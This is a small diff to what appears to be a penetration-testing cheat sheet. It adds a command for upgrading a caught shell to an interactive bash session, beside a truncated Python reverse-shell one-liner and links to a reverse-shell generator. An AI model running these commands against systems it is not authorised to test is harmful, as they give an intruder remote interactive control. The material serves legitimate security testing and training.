@@ -3933,6 +3933,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 - [Reverse Shell Generator](https://www.revshells.com/)
 - [Upgrade a Dumb Shell to a Fully Interactive Shell for More Flexibility](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
   - `python -c 'import pty;pty.spawn("/bin/bash")'`
+  - `/usr/bin/script -qc /bin/bash /dev/null`
 
 #### <ins>Service Exploits</ins>
 
